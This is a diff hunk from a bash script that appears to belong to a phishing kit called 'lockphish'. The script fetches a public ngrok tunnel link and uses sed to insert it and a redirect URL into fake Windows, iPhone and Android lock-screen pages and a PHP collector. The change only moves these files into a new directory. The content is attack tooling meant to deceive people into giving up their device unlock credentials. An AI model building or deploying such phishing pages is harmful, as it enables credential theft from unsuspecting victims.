@@ -158,10 +158,10 @@ url=$redirect #"https://www.youtube.com"
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 payload_name="index"
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpages\e[0m\n"
-sed 's+forwarding_url+'$url'+g' post.php > cat.php
-sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
-sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
-sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html
+sed 's+forwarding_url+'$url'+g' lockphish-new/post.php > lockphish-new/cat.php
+sed 's+forwarding_link+'$link'+g' lockphish-new/win.html | sed 's+forwarding_url+'$url'+g' > lockphish-new/win2.html
+sed 's+forwarding_link+'$link'+g' lockphish-new/phone.html | sed 's+forwarding_url+'$url'+g' > lockphish-new/iphone2.html
+sed 's+forwarding_link+'$link'+g' lockphish-new/droid.html | sed 's+forwarding_url+'$url'+g' > lockphish-new/droid2.html
 
 IFS=$'\n'
 data_base64=$(base64 -w 0 win2.html)
